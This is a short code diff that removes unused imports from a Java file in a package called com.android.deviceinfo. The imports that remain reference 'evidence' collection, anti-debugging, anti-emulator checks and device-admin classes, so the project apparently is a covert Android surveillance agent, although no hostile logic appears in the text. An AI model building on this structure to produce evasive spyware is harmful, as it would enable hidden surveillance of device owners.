@@ -8,20 +8,16 @@
 package com.android.deviceinfo;
 
 import java.io.IOException;
-import java.util.List;
 
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.PendingIntent;
-import android.app.Service;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.content.res.Resources;
-import android.os.AsyncTask;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -38,7 +34,6 @@ import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
-import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.listener.BSm;
 import com.android.deviceinfo.manager.ManagerEvent;
@@ -48,7 +43,6 @@ import com.android.deviceinfo.util.AntiDebug;
 import com.android.deviceinfo.util.AntiEmulator;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
-import com.android.deviceinfo.Reflect;
 
 /**
  * The Class Core, represents
